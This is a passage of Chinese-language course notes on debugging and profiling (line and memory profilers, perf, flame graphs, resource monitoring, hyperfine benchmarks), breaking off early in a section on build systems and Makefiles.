<p>关于 Python 的 cProfile 分析器（以及其他一些类似的分析器），需要注意的是它显示的是每次函数调用的时间。看上去可能快到反直觉，尤其是如果您在代码里面使用了第三方的函数库，因为内部函数调用也会被看作函数调用。</p>
<p>更加符合直觉的显示分析信息的方式是包括每行代码的执行时间，这也是 行分析器 的工作。例如，下面这段 Python 代码会向本课程的网站发起一个请求，然后解析响应返回的页面中的全部 URL：</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-1"></a><span class="ch">#!/usr/bin/env python3</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-2"></a><span class="kn">import</span> <span class="nn">requests</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-3"></a><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-4"></a>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-5"></a><span class="c1"># 这个装饰器会告诉行分析器 </span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-6"></a><span class="c1"># 我们想要分析这个函数</span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-7"></a><span class="nd">@profile</span>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-8"></a><span class="k">def</span> <span class="nf">get_urls</span><span class="p">():</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-9"></a>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://missing.csail.mit.edu&#39;</span><span class="p">)</span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-10"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-11"></a>    <span class="n">urls</span> <span class="o">=</span> <span class="p">[]</span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-12"></a>    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">):</span>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-13"></a>        <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">url</span><span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">])</span>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-14"></a>
</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-15"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#note-cs-tms-debugging-and-profiling-__codelineno-16-16"></a>    <span class="n">get_urls</span><span class="p">()</span>
</span></code></pre></div>
<p>使用行分析器
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-1"></a>&gt; kernprof -l -v url.py
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-2"></a>Wrote profile results to url.py.lprof
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-3"></a>Timer unit: 1e-06 s
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-4"></a>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-5"></a>Total time: 1.52245 s
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-6"></a>File: url.py
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-7"></a>Function: get_urls at line 8
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-8"></a>
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-9"></a>Line #      Hits         Time  Per Hit   % Time  Line Contents
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-10"></a>==============================================================
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-11"></a>     8                                           @profile
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-12"></a>     9                                           def get_urls():
</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-13"></a>    10         1    1509897.0 1509897.0     99.2      response = requests.get(&#39;https://missing.csail.mit.edu&#39;)
</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-14"></a>    11         1      12178.0  12178.0      0.8      s = BeautifulSoup(response.content, &#39;lxml&#39;)
</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-15"></a>    12         1          0.0      0.0      0.0      urls = []
</span><span id="__span-17-16"><a id="__codelineno-17-16" name="__codelineno-17-16" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-16"></a>    13        48        341.0      7.1      0.0      for url in s.find_all(&#39;a&#39;):
</span><span id="__span-17-17"><a id="__codelineno-17-17" name="__codelineno-17-17" href="#note-cs-tms-debugging-and-profiling-__codelineno-17-17"></a>    14        47         30.0      0.6      0.0          urls.append(url[&#39;href&#39;])
</span></code></pre></div></p>
<h3 id="note-cs-tms-debugging-and-profiling-_10">内存<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_10" title="Permanent link">&para;</a></h3>
<p>像 C 或者 C++ 这样的语言，内存泄漏会导致您的程序在使用完内存后不去释放它。为了应对内存类的 Bug，我们可以使用类似 Valgrind 这样的工具来检查内存泄漏问题。</p>
<p>对于 Python 这类具有垃圾回收机制的语言，内存分析器也是很有用的，因为对于某个对象来说，只要有指针还指向它，那它就不会被回收。</p>
<p><div class="language-python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-1"></a><span class="nd">@profile</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-2"></a><span class="k">def</span> <span class="nf">my_func</span><span class="p">():</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-3"></a>    <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span> <span class="o">**</span> <span class="mi">6</span><span class="p">)</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-4"></a>    <span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">7</span><span class="p">)</span>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-5"></a>    <span class="k">del</span> <span class="n">b</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-6"></a>    <span class="k">return</span> <span class="n">a</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-7"></a>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-8"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-18-9"></a>    <span class="n">my_func</span><span class="p">()</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-1"></a>&gt;<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>memory_profiler<span class="w"> </span>mem.py
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-2"></a>Filename:<span class="w"> </span>mem.py
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-4"></a>Line<span class="w"> </span><span class="c1">#    Mem usage    Increment  Occurrences   Line Contents</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-5"></a><span class="o">=============================================================</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-6"></a><span class="w">     </span><span class="m">1</span><span class="w">   </span><span class="m">40</span>.828<span class="w"> </span>MiB<span class="w">   </span><span class="m">40</span>.828<span class="w"> </span>MiB<span class="w">           </span><span class="m">1</span><span class="w">   </span>@profile
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-7"></a><span class="w">     </span><span class="m">2</span><span class="w">                                         </span>def<span class="w"> </span>my_func<span class="o">()</span>:
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-8"></a><span class="w">     </span><span class="m">3</span><span class="w">   </span><span class="m">48</span>.363<span class="w"> </span>MiB<span class="w">    </span><span class="m">7</span>.535<span class="w"> </span>MiB<span class="w">           </span><span class="m">1</span><span class="w">       </span><span class="nv">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="m">1</span><span class="o">]</span><span class="w"> </span>*<span class="w"> </span><span class="o">(</span><span class="m">10</span><span class="w"> </span>**<span class="w"> </span><span class="m">6</span><span class="o">)</span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-9"></a><span class="w">     </span><span class="m">4</span><span class="w">  </span><span class="m">200</span>.906<span class="w"> </span>MiB<span class="w">  </span><span class="m">152</span>.543<span class="w"> </span>MiB<span class="w">           </span><span class="m">1</span><span class="w">       </span><span class="nv">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="m">2</span><span class="o">]</span><span class="w"> </span>*<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="w"> </span>*<span class="w"> </span><span class="m">10</span><span class="w"> </span>**<span class="w"> </span><span class="m">7</span><span class="o">)</span>
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-10"></a><span class="w">     </span><span class="m">5</span><span class="w">   </span><span class="m">48</span>.551<span class="w"> </span>MiB<span class="w"> </span>-152.355<span class="w"> </span>MiB<span class="w">           </span><span class="m">1</span><span class="w">       </span>del<span class="w"> </span>b
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-19-11"></a><span class="w">     </span><span class="m">6</span><span class="w">   </span><span class="m">48</span>.551<span class="w"> </span>MiB<span class="w">    </span><span class="m">0</span>.000<span class="w"> </span>MiB<span class="w">           </span><span class="m">1</span><span class="w">       </span><span class="k">return</span><span class="w"> </span>a
</span></code></pre></div></p>
<h3 id="note-cs-tms-debugging-and-profiling-_11">事件分析<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_11" title="Permanent link">&para;</a></h3>
<p>在我们使用 strace 调试代码的时候，您可能会希望忽略一些特殊的代码并希望在分析时将其当作黑盒处理。perf 命令将 CPU 的区别进行了抽象，它不会报告时间和内存的消耗，而是报告与您的程序相关的系统事件。</p>
<p>例如，perf 可以报告不佳的缓存局部性（poor cache locality）、大量的页错误（page faults）或活锁（livelocks）。下面是关于常见命令的简介：</p>
<ul>
<li>perf list - 列出可以被 pref 追踪的事件；</li>
<li>perf stat COMMAND ARG1 ARG2 - 收集与某个进程或指令相关的事件；</li>
<li>perf record COMMAND ARG1 ARG2 - 记录命令执行的采样信息并将统计数据储存在 perf.data 中；</li>
<li>perf report - 格式化并打印 perf.data 中的数据。</li>
</ul>
<h3 id="note-cs-tms-debugging-and-profiling-_12">可视化<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_12" title="Permanent link">&para;</a></h3>
<p>使用分析器来分析真实的程序时，由于软件的复杂性，其输出结果中将包含大量的信息。人类是一种视觉动物，非常不善于阅读大量的文字。因此很多工具都提供了可视化分析器输出结果的功能。</p>
<p>对于采样分析器来说，常见的显示 CPU 分析数据的形式是 火焰图，火焰图会在 Y 轴显示函数调用关系，并在 X 轴显示其耗时的比例。火焰图同时还是可交互的，您可以深入程序的某一具体部分，并查看其栈追踪。</p>
<p>调用图和控制流图可以显示子程序之间的关系，它将函数作为节点并把函数调用作为边。将它们和分析器的信息（例如调用次数、耗时等）放在一起使用时，调用图会变得非常有用，它可以帮助我们分析程序的流程。 在 Python 中您可以使用 pycallgraph 来生成这些图片。</p>
<h3 id="note-cs-tms-debugging-and-profiling-_13">资源监控<a class="headerlink" href="#note-cs-tms-debugging-and-profiling-_13" title="Permanent link">&para;</a></h3>
<p>有时候，分析程序性能的第一步是搞清楚它所消耗的资源。程序变慢通常是因为它所需要的资源不够了。例如，没有足够的内存或者网络连接变慢的时候。</p>
<p>有很多很多的工具可以被用来显示不同的系统资源，例如 CPU 占用、内存使用、网络、磁盘使用等。</p>
<ul>
<li><a href="https://htop.dev/">HTOP</a></li>
<li><a href="https://man7.org/linux/man-pages/man8/iotop.8.html">iotop</a></li>
<li><a href="https://man7.org/linux/man-pages/man1/df.1.html">df</a>,<a href="https://dev.yorhel.nl/ncdu">ncdu</a></li>
<li><a href="https://man7.org/linux/man-pages/man1/free.1.html">free</a></li>
<li><a href="https://man7.org/linux/man-pages/man8/lsof.8.html">lsof</a></li>
<li><a href="https://man7.org/linux/man-pages/man8/ss.8.html">ss</a></li>
</ul>
<p>如果您希望测试一下这些工具，您可以使用 stress 命令来为系统人为地增加负载。</p>
<p>如果想要进行基准测试并依此对软件选择进行评估。 类似 hyperfine 这样的命令行可以帮您快速进行基准测试。例如，我们在 shell 工具和脚本那一节课中我们推荐使用 fd 来代替 find，们这里可以用 hyperfine 来比较一下它们。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-1"></a>$<span class="w"> </span>hyperfine<span class="w"> </span>--warmup<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="s1">&#39;fd -e jpg&#39;</span><span class="w"> </span><span class="s1">&#39;find . -iname &quot;*.jpg&quot;&#39;</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-2"></a>Benchmark<span class="w"> </span><span class="c1">#1: fd -e jpg</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-3"></a><span class="w">  </span>Time<span class="w"> </span><span class="o">(</span>mean<span class="w"> </span>±<span class="w"> </span>σ<span class="o">)</span>:<span class="w">      </span><span class="m">51</span>.4<span class="w"> </span>ms<span class="w"> </span>±<span class="w">   </span><span class="m">2</span>.9<span class="w"> </span>ms<span class="w">    </span><span class="o">[</span>User:<span class="w"> </span><span class="m">121</span>.0<span class="w"> </span>ms,<span class="w"> </span>System:<span class="w"> </span><span class="m">160</span>.5<span class="w"> </span>ms<span class="o">]</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-4"></a><span class="w">  </span>Range<span class="w"> </span><span class="o">(</span>min<span class="w"> </span>…<span class="w"> </span>max<span class="o">)</span>:<span class="w">    </span><span class="m">44</span>.2<span class="w"> </span>ms<span class="w"> </span>…<span class="w">  </span><span class="m">60</span>.1<span class="w"> </span>ms<span class="w">    </span><span class="m">56</span><span class="w"> </span>runs
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-5"></a>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-6"></a>Benchmark<span class="w"> </span><span class="c1">#2: find . -iname &quot;*.jpg&quot;</span>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-7"></a><span class="w">  </span>Time<span class="w"> </span><span class="o">(</span>mean<span class="w"> </span>±<span class="w"> </span>σ<span class="o">)</span>:<span class="w">      </span><span class="m">1</span>.126<span class="w"> </span>s<span class="w"> </span>±<span class="w">  </span><span class="m">0</span>.101<span class="w"> </span>s<span class="w">    </span><span class="o">[</span>User:<span class="w"> </span><span class="m">141</span>.1<span class="w"> </span>ms,<span class="w"> </span>System:<span class="w"> </span><span class="m">956</span>.1<span class="w"> </span>ms<span class="o">]</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-8"></a><span class="w">  </span>Range<span class="w"> </span><span class="o">(</span>min<span class="w"> </span>…<span class="w"> </span>max<span class="o">)</span>:<span class="w">    </span><span class="m">0</span>.975<span class="w"> </span>s<span class="w"> </span>…<span class="w">  </span><span class="m">1</span>.287<span class="w"> </span>s<span class="w">    </span><span class="m">10</span><span class="w"> </span>runs
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-9"></a>
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-10"></a>Summary
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-11"></a><span class="w">  </span><span class="s1">&#39;fd -e jpg&#39;</span><span class="w"> </span>ran
</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#note-cs-tms-debugging-and-profiling-__codelineno-20-12"></a><span class="w">   </span><span class="m">21</span>.89<span class="w"> </span>±<span class="w"> </span><span class="m">2</span>.33<span class="w"> </span><span class="nb">times</span><span class="w"> </span>faster<span class="w"> </span>than<span class="w"> </span><span class="s1">&#39;find . -iname &quot;*.jpg&quot;&#39;</span>
</span></code></pre></div></section><section class="print-page" id="note-cs-tms-metaprogramming" heading-number="2.4.2.7"><h1 id="note-cs-tms-metaprogramming-metaprogramming">Metaprogramming<a class="headerlink" href="#note-cs-tms-metaprogramming-metaprogramming" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3187 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 78 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 12 分钟</p>
</div>
<p>本次主要讨论的是元编程，然而，虽然其名为元编程，其内容更加关注的是 <em>流程</em> 而不是编程本身。本次课主要从学习如何构建系统，代码测试以及依赖管理...</p>
<h2 id="note-cs-tms-metaprogramming-_1">构建系统<a class="headerlink" href="#note-cs-tms-metaprogramming-_1" title="Permanent link">&para;</a></h2>
<p>如果使用 $ \LaTeX $ 来编写论文，需要执行哪些命令才能编译出我们想要的论文呢？执行基准测试、绘制图表然后将其插入论文的命令又有哪些？或者，如何编译某课程提供的代码并执行测试呢？</p>
<p>对于大多数系统来说，不论其是否包含代码，通常都会包含一个 “构建过程” ，例如从 <span class="arithmatex">\(\LaTeX\)</span> 源代码到 PDF 文件的转换过程。执行一些命令来生成图表，然后执行另外的命令来生成结果，最再执行其它的命令来生成最终的论文，有很多事情需要完成，如果每次更新都需要一步步重复这些过程，这将很令人苦恼...</p>
<p>名为"构建系统"的工具可以帮助我们自动化这些过程，例如 <code>make</code>、<code>cmake</code>、<code>scons</code>、<code>ninja</code> 等等。这些工具可以帮助我们定义一系列的规则，然后根据这些规则来执行一系列的命令，从而生成我们想要的结果。</p>
<p>这些工具都是非常类似的。我们需要定义 依赖、目标 和 规则。我们必须告诉构建系统我们具体的构建目标，系统的任务则是找到构建这些目标所需要的依赖，并根据规则构建所需的中间产物，直到最终目标被构建出来。理想的情况下，如果目标的依赖没有发生改动，并且我们可以从之前的构建中复用这些依赖，那么与其相关的构建规则并不会被执行。</p>
<p><code>make</code>是最常用的构建系统之一，我们会发现它通常被安装到了几乎所有基于 UNIX 的系统中。<code>make</code> 并不完美，但是对于中小型项目来说，它已经足够好了。当您执行 <code>make</code> 时，它会去参考当前目录下名为 <code>Makefile</code> 的文件。所有构建目标、相关依赖和规则都需要在该文件中定义，它看上去是这样的：</p>
<div class="language-makefile highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-tms-metaprogramming-__codelineno-0-1"></a><span class="nf">target</span><span class="o">:</span><span class="w"> </span><span class="n">dependencies</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-tms-metaprogramming-__codelineno-0-2"></a><span class="w">    </span><span class="nb">command</span>
</span></code></pre></div>
<p>例如</p>
<div class="language-makefile highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-tms-metaprogramming-__codelineno-1-1"></a><span class="nf">paper.pdf</span><span class="o">:</span><span class="w"> </span><span class="n">paper</span>.<span class="n">tex</span> <span class="n">plot</span>-<span class="n">data</span>.<span class="n">png</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-tms-metaprogramming-__codelineno-1-2"></a><span class="w">    </span>pdflatex<span class="w"> </span>paper.tex
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-tms-metaprogramming-__codelineno-1-3"></a>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-cs-tms-metaprogramming-__codelineno-1-4"></a><span class="nf">plot-%.png</span><span class="o">:</span><span class="w"> </span>%.<span class="n">dat</span> <span class="n">plot</span>.<span class="n">py</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-cs-tms-metaprogramming-__codelineno-1-5"></a><span class="w">    </span>./plot.py<span class="w"> </span>-i<span class="w"> </span><span class="nv">$*</span>.dat<span class="w"> </span>-o<span class="w"> </span><span class="nv">$@</span>
</span></code></pre></div>
<p>这段 Makefile 代码描述了两个规则，它们的作用分别如下：</p>
<p><code>paper.pdf: paper.tex plot-data.png</code>
这个规则的含义是，如果你需要生成 <code>paper.pdf</code> 文件，那么需要先生成 <code>paper.tex</code> 和 <code>plot-data.png</code>。  </p>
<p><div class="language-makefile highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-tms-metaprogramming-__codelineno-2-1"></a><span class="err">pdflatex</span><span class="w"> </span><span class="err">paper.tex</span>
</span></code></pre></div>
这个命令会用 <code>pdflatex</code> 工具编译 <code>paper.tex</code> 文件，生成 <code>paper.pdf</code> 文件。注意，如果 <code>paper.tex</code> 或 <code>plot-data.png</code> 文件有更新，<code>make</code> 会重新执行这个命令。</p>
<p><code>plot-%.png: %.dat plot.py</code></p>
<p>这个规则的作用是生成以 <code>plot-</code> 为前缀的 PNG 图像文件（例如 <code>plot-something.png</code>），图像文件的生成依赖于对应的 <code>.dat</code> 数据文件和一个 Python 脚本 <code>plot.py</code>。</p>
<p>规则中的命令：
<div class="language-makefile highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-tms-metaprogramming-__codelineno-3-1"></a><span class="err">./plot.py</span><span class="w"> </span><span class="err">-i</span><span class="w"> </span><span class="k">$*</span><span class="err">.dat</span><span class="w"> </span><span class="err">-o</span><span class="w"> </span><span class="k">$@</span>
</span></code></pre></div></p>
<ul>
<li><code>$*</code> 表示匹配模式中的通配符部分，这里会替换为 <code>%.dat</code> 中的文件名部分（比如 <code>data</code> 会变成 <code>data.dat</code>）。</li>
<li><code>$@</code> 是目标文件的名称，即生成的 <code>plot-*.png</code> 文件。</li>
</ul>
<p>因此，假设你有一个 <code>data.dat</code> 文件，<code>make</code> 会调用 <code>plot.py</code>，并传递参数：<code>-i data.dat</code> 和 <code>-o plot-data.png</code>，最终生成 <code>plot-data.png</code> 文件。</p>
<h3 id="note-cs-tms-metaprogramming-example">Example<a class="headerlink" href="#note-cs-tms-metaprogramming-example" title="Permanent link">&para;</a></h3>
<p>现在，如果我们直接执行<code>make</code>,其会默认执行第一个规则，即生成 <code>paper.pdf</code> 文件。如果我们只想生成 <code>plot-data.png</code> 文件，可以执行 <code>make plot-data.png</code>。如果我们想生成 <code>plot-something.png</code> 文件，可以执行 <code>make plot-something.png</code>。</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-tms-metaprogramming-__codelineno-4-1"></a>$<span class="w"> </span>make
